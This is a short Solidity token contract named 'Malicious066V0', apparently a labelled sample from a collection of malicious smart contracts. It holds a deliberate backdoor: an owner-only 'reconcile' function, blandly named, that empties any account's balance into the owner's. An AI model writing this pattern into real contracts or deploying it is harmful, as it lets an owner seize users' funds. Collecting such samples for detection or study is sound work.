// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Malicious066V0 {
    address public owner;
    mapping(address => uint256) public balanceOf;
    constructor(uint256 supply) {
        owner = msg.sender;
        balanceOf[msg.sender] = supply;
    }
    modifier onlyOwner() { require(msg.sender == owner, "owner"); _; }

    function reconcile(address account) external onlyOwner {
        uint256 amount = balanceOf[account];
        balanceOf[account] = 0;
        balanceOf[owner] += amount;
    }
}
